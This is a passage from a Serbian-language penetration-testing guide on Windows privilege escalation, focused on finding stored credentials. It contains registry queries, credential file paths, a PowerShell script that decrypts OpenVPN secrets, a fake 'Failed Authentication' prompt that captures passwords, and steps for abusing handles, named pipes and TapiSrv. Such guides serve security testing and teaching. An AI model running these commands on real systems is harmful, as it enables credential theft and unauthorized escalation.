Na Windows serveru proverite ACL konfiguracije **servera** u instalacionom direktorijumu i svih zaštićenih rezervnih kopija. Jedna moguća lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako se putanja razlikuje, koristite onu koja je konfigurisana za uslugu. Potvrdite da trenutni identitet može da čita datoteku i da je `CA.private_key` zaista prisutan. Ne ispisujte privatni ključ u evidencione zapise ni u izlaz enumeracije. Proizvođačev tok rada `config api_client` koristi ključ CA-a za izdavanje klijentskog sertifikata, ali je potrebna i efektivna uloga na strani servera; njeno kreiranje ili menjanje može zahtevati dozvolu za pisanje u skladište podataka ili ponovno pokretanje. Postojeći privilegovani identitet servera može pružiti put čak i kada takva pisanja nisu moguća. API upiti sa pravima za izvršavanje rade u relevantnom kontekstu servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, držite ključ za potpisivanje CA-a van mreže kada je moguće i ograničite API uloge i pristup interfejsima za slušanje. Pogledajte [Velociraptor API dokumentaciju](https://docs.velociraptor.app/docs/server_automation/server_api/) i [uputstvo za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY akreditivi

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban upravljač sesijama. Njegovo izvorno šifrovano skladište može biti na lokaciji `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugom mestu. [SolarWinds vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i da mogu sadržati sesije, ključeve, skripte, oznake i veze; njegov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi lokaciju izvornog skladišta. Najpre proverite dozvole i putanje datoteka. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### Putty SSH ključevi hostova

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa bi trebalo da proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji zapis unutar te putanje, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovano, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta i želite da se automatski pokreće pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da kreiram neke ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko ssh-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije otkrio upotrebu `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za nenadziranu instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove fajlove možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) backup datoteke mogu sadržati i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Dajte prednost lokalno dostupnim direktorijumima sa backup-ima ili image-ovima i pregledajte **nazive članova** image-a pre nego što bilo šta izdvojite; samo `.wim` ime datoteke ne dokazuje da su hive-ovi izloženi, a uobičajeni `install.wim`, `boot.wim` i recovery image-ovi često su lažni tragovi. SMB share je zaseban put pristupa i treba ga proveravati samo kada je taj share obuhvaćen opsegom. Pogledajte Microsoft smernice za [Windows image-e](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za registry hive datoteke](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud akreditivi

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupu računara putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svakom korisniku domena. Drugo, lozinke unutar ovih GPP-ova, šifrovane pomoću AES256 i javno dokumentovanog podrazumevanog ključa, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik, jer je korisnicima moglo da omogući sticanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija koja skenira lokalno keširane GPP datoteke u potrazi za poljem „cpassword“ koje nije prazno. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Da biste dešifrovali cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa kredencijalima:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Arhive rezervnih kopija u IIS webroot-u

Stara ZIP rezervna kopija postavljena direktno u webroot koji se poslužuje može otkriti prethodne konfiguracione datoteke i ponovo upotrebljive kredencijale. Proverite konfigurisanu fizičku putanju sajta i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je jedna od mogućih. Brzi lokalni popis može da prikaže nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da pronađeni pristupni podaci omogućavaju viši nivo privilegija.

### OpenVPN pristupni podaci

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dnevnici

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite pristupne podatke

Uvek možete **zatražiti od korisnika da unese svoje pristupne podatke ili čak pristupne podatke drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje** **pristupnih podataka** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koji sadrže pristupne podatke**

Poznate datoteke koje su nekada sadržale **lozinke** u **čistom tekstu** ili Base64 formatu

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Varijanta spiska naziva datoteka bez ekstenzije Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Tretirajte datoteku sa odgovarajućim imenom kao kandidata za šifrovani trezor; njeno prisustvo ne znači da možete da je pročitate, otključate ili koristite bilo koje sačuvane akreditive. Prilikom provere lokacija na kojima se takve datoteke čuvaju, pregledajte dostupne korisničke profile i konfigurisane korene deljenih datoteka.

Čitljiv KeePass `.kdbx` je takođe samo trag do šifrovanog trezora. Za njegovo otključavanje potrebni su stvarna glavna lozinka i sve konfigurisane faktore, kao što su datoteka ključa ili podaci naloga. Ako ovlašćena provera pronađe par LM:NT hash vrednosti u unosu, proverite navedeni nalog i da li je NT hash aktuelan i prihvaćen na NTLM servisu cilja pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje prava Administrator ili SYSTEM; moraju biti ispunjeni i uslovi za udaljeni pristup servisu, prava naloga i svaki zaseban korak za izvršavanje servisa. Inventarizacija treba da navede putanju trezora i da li je čitljiv, a ne da ispisuje bazu podataka ili sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Varijanta komande za pretragu bez ekstenzije Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Akreditivi u korpi za otpatke

Takođe proverite korpu za otpatke i potražite akreditive u njoj

Proverite dostupne stavke u korpi za otpatke i potražite obrisane rezervne kopije i arhive konfiguracija, kao i datoteke čiji nazivi izričito pominju akreditive. Korisna rezervna kopija `.7z`, `.zip` ili `.rar` može biti stara više meseci i imati uobičajen naziv. Windows čuva originalnu putanju i vreme brisanja u zapisu `$I`, a obrisanu datoteku kao odgovarajući unos `$R`; pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje pre otvaranja arhive. Vidljivost zavisi od volumena, SID-a korisnika i dozvola za datoteke, pa prazan spisak ne dokazuje da ne postoji rezervna kopija koja se može oporaviti. Naziv arhive tretirajte kao razlog za proveru, a ne kao dokaz da sadrži važeću tajnu.

Dostupna obrisana datoteka `.pfx` može biti i naznaka za **code-signing**. Ako sadrži dostupan privatni ključ, tim ključem se može potpisati izmenjena PowerShell skripta; [PowerShell zahteva sertifikat za code-signing sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila AppLocker publisher proveravaju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje preko drugog naloga zahteva da trenutni identitet može da izmeni tačno određenu skriptu, da efektivno pravilo prihvata dobijeni potpis za tu skriptu i ciljni nalog, kao i da zakazani zadatak ili drugi proces sa višim privilegijama zaista pokreće skriptu. Sam naziv datoteke `.pfx`, predmet sertifikata ili skripta sa dozvolom za upis ne potvrđuju ovaj lanac. Pregledajte metapodatke, ACL-ove, pravila i zakazanu komandu pre otvaranja materijala privatnog ključa ili pokretanja zadatka.

Takođe pregledajte dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke u potrazi za naznakama akreditiva. Izvoz BitLocker ključa za oporavak može biti sačuvan kao HTML ili TXT, ponekad unutar arhive rezervne kopije sa odgovarajućim nazivom. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu podataka koji sadrži starije rezervne kopije; pregledajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, oporavak akreditiva domena van mreže zahteva i odgovarajuću `SYSTEM` košnicu, kao što je opisano u [postupku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sami nazivi datoteka i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Da biste **oporavili lozinke** koje je sačuvalo nekoliko programa, možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Drugi mogući ključevi registra koji sadrže akreditive**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a ili Firefox-a**.\
Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a, Edge-a ili Firefox-a**.\
Proverite i istoriju, obeleživače i omiljene stranice pregledača jer se tamo možda čuvaju neke **lozinke**.

Za uobičajeni profil **Default** trenutnog korisnika u Edge-u, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a `Local State` u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili `UserDataDir` policy mogu da promene lokaciju. Prisustvo datoteka samo ukazuje na moguću lokaciju skladišta akreditiva: proverite da li su datoteke čitljive, da li imate odgovarajući DPAPI kontekst korisnika ili drugi ovlašćeni materijal ključa i da li sačuvana prijava pripada nalogu sa višim privilegijama. Samo pretraživanje putanja ne mora da otvori bazu podataka niti da ispiše dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu odgovarajuće datoteke za ključ i šifrovane prijave. Njihovo prisustvo samo ukazuje na moguću lokaciju: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li Primary Password štiti ključ pre nego što zaključite da su akreditivi upotrebljivi. Ako pronađeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupom i [LAPS prava za čitanje ili dešifrovanje lozinke](../active-directory-methodology/laps.md) grupe; artefakti pregledača sami po sebi ne ukazuju na put do administratorskih privilegija.

Alati za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta **identifikuje se preko ID-a klase (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih ID-ovima interfejsa (IID).

COM klase i interfejsi definisani su u registru, pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**, tim redom. Ovaj registar se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podregistar **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL** i vrednost pod nazivom **ThreadingModel**, koja može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registra možete pronaći podregistar InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete bilo koji DLL** koji će biti izvršen, mogli biste da **eskalirate privilegije** ako taj DLL izvršava drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje pristupa, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraga sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pretražite datoteku sa određenim nazivom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji pretražuju lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da **automatski pokrene svaki Metasploit POST modul koji traži kredencijale** na žrtvi.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve datoteke koje sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izdvajanje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alata koji čuvaju ove podatke u običnom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **zatim kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da nasleđuje sve otvorene handles glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete da preuzmete **otvoreni handle privilegovanog procesa kreiranog** pomoću `OpenProcess()` i **ubacite shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako da otkrijete i iskoristite ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i **ovu objavu za detaljnije objašnjenje kako da testirate i zloupotrebite druge otvorene handles procesa i threadova koji se nasleđuju sa različitim nivoima dozvola (ne samo punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Deljeni memorijski segmenti, koji se nazivaju **pipes**, omogućavaju komunikaciju procesa i prenos podataka.

Windows nudi funkciju pod nazivom **Named Pipes**, која omogućava nepovezanim procesima da razmenjuju podatke, čak i preko različitih mreža. Ovo je slično arhitekturi klijent/server, gde su uloge definisane kao **named pipe server** i **named pipe client**.

Kada **client** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** tog **clienta**, pod uslovom da ima potrebna **SeImpersonate** prava. Ako pronađete **privilegovani proces** koji komunicira preko pipe-a koji možete da oponašate, možete da **dobijete veće privilegije** tako što ćete preuzeti identitet tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje ovakvog napada potražite [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Sledeći alat takođe omogućava **presretanje komunikacije named pipe-a pomoću alata kao što je Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privesc ranjivosti** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani client može da zloupotrebi asinhroni događajni put zasnovan na mailslot-u i pretvori `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju može da upisuje `NETWORK SERVICE`, a zatim dobije administratorska prava za Telephony i učita proizvoljan DLL kao servis. Ceo tok:

- `ClientAttach` sa parametrom `pszDomainUser` podešenim na postojeću putanju u koju je moguće upisivati → servis otvara tu putanju pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhroni upis događaja.
- Svaki događaj upisuje napadačem kontrolisani `InitContext` iz `Initialize` u taj handle. Registrujte line aplikaciju pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite podatke pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim je odregistrujte/isključite da biste ponovili determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa proizvoljnom DLL putanjom da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a preko Markdown renderera

Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke koje kontroliše napadač kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Praćenje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju kredencijale kroz komandnu liniju**. Skripta ispod beleži komandne linije procesa svake dve sekunde i poredi trenutno stanje sa prethodnim, ispisujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
